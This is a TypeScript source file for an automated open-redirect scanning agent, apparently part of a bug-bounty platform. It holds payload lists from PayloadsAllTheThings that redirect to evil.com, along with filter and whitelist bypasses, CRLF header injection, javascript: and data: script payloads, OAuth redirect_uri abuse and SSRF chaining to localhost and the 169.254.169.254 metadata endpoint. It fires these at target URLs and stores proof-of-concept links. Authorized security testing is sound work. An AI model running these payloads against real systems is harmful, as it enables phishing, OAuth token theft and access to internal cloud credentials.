/**
 * Open Redirect Agent
 * Based on PayloadsAllTheThings/Open Redirect
 * 
 * Detects and exploits open redirect vulnerabilities:
 * - Parameter-based redirects
 * - Header-based redirects
 * - JavaScript redirects
 * - Meta refresh redirects
 * - OAuth redirect_uri abuse
 * - SSRF via redirect chains
 */

import { Job } from 'bullmq';
import { BaseAgent } from './base';
import logger from '../utils/logger';
import database from '../services/database';

interface OpenRedirectJob {
  programId: string;
  scanId: string;
  urls: string[];
  options?: {
    testAllParams?: boolean;
    chainWithSSRF?: boolean;
    testOAuth?: boolean;
  };
}

// Open Redirect Payloads from PayloadsAllTheThings
const REDIRECT_PAYLOADS = {
  // Basic redirects
  basic: [
    'https://evil.com',
    '//evil.com',
    '/\\evil.com',
    'https:evil.com',
    '///evil.com',
    '////evil.com',
  ],

  // Protocol-relative
  protocolRelative: [
    '//evil.com',
    '///evil.com',
    '\\\\evil.com',
    '/\\/evil.com',
  ],

  // Bypass filters
  filterBypass: [
    'https://evil.com%2f%2f',
    'https://evil.com%00',
    'https://evil.com%0d%0a',
    '//evil%E3%80%82com', // Unicode dot
    '//evil。com',         // Fullwidth dot
    '//evil%00.com',
    'https://evil.com#@trusted.com',
    'https://evil.com?@trusted.com',
    'https://trusted.com@evil.com',
    'https://trusted.com%40evil.com',
  ],

  // JavaScript-based
  javascript: [
    'javascript:alert(document.domain)',
    'javascript://evil.com/%0aalert(1)',
    'data:text/html,<script>location="https://evil.com"</script>',
    'vbscript:msgbox("xss")',
  ],

  // Whitelisted domain bypass
  whitelistBypass: [
    'https://evil.com/.trusted.com',
    'https://trusted.com.evil.com',
    'https://trustedcom.evil.com',
    'https://evil.com/trusted.com',
    'https://evil.com?trusted.com',
    'https://evil.com#trusted.com',
  ],

  // CRLF + redirect
  crlfRedirect: [
    '%0d%0aLocation:https://evil.com',
    '%0aLocation:https://evil.com',
    '%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 302 Found%0d%0aLocation:https://evil.com',
  ],

  // URL encoding variations
  encoded: [
    'https%3A%2F%2Fevil.com',
    'https%3A//evil.com',
    '%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d', // Full hex
    'https:%252F%252Fevil.com', // Double encoded
  ],
};

// Common redirect parameters
const REDIRECT_PARAMS = [
  'url', 'redirect', 'redirect_url', 'redirect_uri', 'redirectUrl', 'redirectUri',
  'return', 'return_url', 'returnUrl', 'returnTo', 'return_to',
  'next', 'next_url', 'nextUrl', 'goto', 'go', 'target', 'to', 'dest', 'destination',
  'redir', 'redirect_to', 'out', 'view', 'link', 'ref', 'site', 'host',
  'callback', 'callback_url', 'continue', 'forward', 'forward_url',
  'location', 'path', 'data', 'reference', 'page', 'feed', 'port',
  'checkout_url', 'success_url', 'failure_url', 'cancel_url',
];

export class OpenRedirectAgent extends BaseAgent<OpenRedirectJob> {
  constructor() {
    super('open-redirect');
  }

  protected getSteps() {
    return [
      { name: 'Identify redirect parameters', metadata: {} },
      { name: 'Test basic redirect payloads', metadata: {} },
      { name: 'Test filter bypass techniques', metadata: {} },
      { name: 'Test JavaScript redirects', metadata: {} },
      { name: 'Chain with SSRF if applicable', metadata: {} },
    ];
  }

  async process(job: Job<OpenRedirectJob>): Promise<any> {
    const { programId, scanId, urls, options = {} } = job.data;
    const findings: any[] = [];

    logger.info({ urlCount: urls.length }, 'Starting open redirect testing');

    for (const url of urls) {
      try {
        // Test existing parameters
        const paramFindings = await this.testExistingParams(url);
        findings.push(...paramFindings);

        // Test common redirect parameters
        if (options.testAllParams) {
          const commonParamFindings = await this.testCommonParams(url);
          findings.push(...commonParamFindings);
        }

        // Test OAuth redirect_uri if enabled
        if (options.testOAuth) {
          const oauthFindings = await this.testOAuthRedirect(url);
          findings.push(...oauthFindings);
        }

        // Chain with SSRF if enabled
        if (options.chainWithSSRF && findings.length > 0) {
          const ssrfFindings = await this.chainWithSSRF(url, findings);
          findings.push(...ssrfFindings);
        }
      } catch (error) {
        logger.error({ error, url }, 'Error testing open redirect');
      }
    }

    // Store findings
    for (const finding of findings) {
      await this.storeFinding(programId, scanId, finding);
    }

    return {
      totalUrls: urls.length,
      findings: findings.length,
      vulnerabilities: findings,
    };
  }

  private async testExistingParams(url: string): Promise<any[]> {
    const findings: any[] = [];
    
    try {
      const urlObj = new URL(url);
      const params = urlObj.searchParams;

      for (const [param, originalValue] of params.entries()) {
        // Check if this looks like a redirect parameter
        if (this.isRedirectParam(param) || this.looksLikeUrl(originalValue)) {
          const paramFindings = await this.testPayloads(url, param, originalValue);
          findings.push(...paramFindings);
        }
      }
    } catch (error) {
      logger.debug({ error, url }, 'Error parsing URL');
    }

    return findings;
  }

  private async testCommonParams(url: string): Promise<any[]> {
    const findings: any[] = [];

    for (const param of REDIRECT_PARAMS) {
      const paramFindings = await this.testPayloads(url, param, '');
      findings.push(...paramFindings);
    }

    return findings;
  }

  private async testPayloads(baseUrl: string, param: string, originalValue: string): Promise<any[]> {
    const findings: any[] = [];
    const allPayloads = [
      ...REDIRECT_PAYLOADS.basic,
      ...REDIRECT_PAYLOADS.filterBypass,
      ...REDIRECT_PAYLOADS.protocolRelative,
    ];

    for (const payload of allPayloads) {
      try {
        const testUrl = this.buildTestUrl(baseUrl, param, payload);
        const result = await this.checkRedirect(testUrl, payload);

        if (result.vulnerable) {
          findings.push({
            type: 'open-redirect',
            url: baseUrl,
            parameter: param,
            payload,
            redirectedTo: result.redirectedTo,
            severity: this.determineSeverity(result),
            poc: testUrl,
            technique: this.identifyTechnique(payload),
          });
          break; // Found vulnerability, no need to test more payloads for this param
        }
      } catch (error) {
        // Continue testing
      }
    }

    return findings;
  }

  private async testOAuthRedirect(url: string): Promise<any[]> {
    const findings: any[] = [];
    const oauthParams = ['redirect_uri', 'callback', 'callback_url', 'return_uri'];

    // Check if URL looks like OAuth endpoint
    if (!url.includes('oauth') && !url.includes('authorize') && !url.includes('login')) {
      return findings;
    }

    for (const param of oauthParams) {
      for (const payload of REDIRECT_PAYLOADS.whitelistBypass) {
        try {
          const testUrl = this.buildTestUrl(url, param, payload);
          const result = await this.checkRedirect(testUrl, payload);

          if (result.vulnerable) {
            findings.push({
              type: 'oauth-redirect-bypass',
              url,
              parameter: param,
              payload,
              severity: 'high', // OAuth redirects are high severity
              poc: testUrl,
              impact: 'Token theft via OAuth redirect manipulation',
            });
            break;
          }
        } catch (error) {
          // Continue
        }
      }
    }

    return findings;
  }

  private async chainWithSSRF(url: string, redirectFindings: any[]): Promise<any[]> {
    const ssrfFindings: any[] = [];
    const internalTargets = [
      'http://127.0.0.1',
      'http://localhost',
      'http://169.254.169.254', // AWS metadata
      'http://[::1]',
      'http://0.0.0.0',
    ];

    for (const finding of redirectFindings) {
      for (const target of internalTargets) {
        try {
          const testUrl = this.buildTestUrl(url, finding.parameter, target);
          const result = await this.checkRedirect(testUrl, target);

          if (result.vulnerable && result.redirectedTo?.includes('127.0.0.1') || 
              result.redirectedTo?.includes('localhost') ||
              result.redirectedTo?.includes('169.254.169.254')) {
            ssrfFindings.push({
              type: 'open-redirect-to-ssrf',
              url,
              parameter: finding.parameter,
              payload: target,
              severity: 'critical',
              poc: testUrl,
              impact: 'SSRF via open redirect chain',
            });
          }
        } catch (error) {
          // Continue
        }
      }
    }

    return ssrfFindings;
  }

  private buildTestUrl(baseUrl: string, param: string, payload: string): string {
    try {
      const urlObj = new URL(baseUrl);
      urlObj.searchParams.set(param, payload);
      return urlObj.toString();
    } catch {
      return `${baseUrl}${baseUrl.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(payload)}`;
    }
  }

  private async checkRedirect(url: string, expectedDomain: string): Promise<any> {
    try {
      const response = await fetch(url, {
        method: 'GET',
        redirect: 'manual',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        },
      });

      const location = response.headers.get('location');
      
      if (response.status >= 300 && response.status < 400 && location) {
        // Check if redirected to our payload domain
        if (location.includes('evil.com') || 
            location.includes(expectedDomain.replace('https://', '').replace('http://', ''))) {
          return {
            vulnerable: true,
            redirectedTo: location,
            status: response.status,
          };
        }
      }

      // Check for JavaScript redirects in body
      if (response.status === 200) {
        const body = await response.text();
        if (body.includes('location.href') && body.includes('evil.com')) {
          return {
            vulnerable: true,
            redirectedTo: 'JavaScript redirect',
            status: response.status,
          };
        }
      }

      return { vulnerable: false };
    } catch (error) {
      return { vulnerable: false, error };
    }
  }

  private isRedirectParam(param: string): boolean {
    const lowerParam = param.toLowerCase();
    return REDIRECT_PARAMS.some(p => lowerParam.includes(p.toLowerCase()));
  }

  private looksLikeUrl(value: string): boolean {
    return value.startsWith('http') || value.startsWith('//') || value.startsWith('/');
  }

  private determineSeverity(result: any): string {
    if (result.redirectedTo?.includes('169.254.169.254')) return 'critical';
    if (result.redirectedTo?.includes('127.0.0.1')) return 'high';
    if (result.redirectedTo?.includes('javascript:')) return 'high';
    return 'medium';
  }

  private identifyTechnique(payload: string): string {
    if (payload.startsWith('//')) return 'protocol-relative';
    if (payload.includes('%')) return 'url-encoded';
    if (payload.includes('@')) return 'authority-confusion';
    if (payload.includes('javascript:')) return 'javascript-redirect';
    return 'basic';
  }

  private async storeFinding(programId: string, scanId: string, finding: any): Promise<void> {
    try {
      await database.query(
        `INSERT INTO vulnerabilities (program_id, scan_id, type, url, severity, details, poc, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, $7, CURRENT_TIMESTAMP)`,
        [programId, scanId, finding.type, finding.url, finding.severity, JSON.stringify(finding), finding.poc]
      );
    } catch (error) {
      logger.error({ error }, 'Failed to store open redirect finding');
    }
  }
}

export default new OpenRedirectAgent();
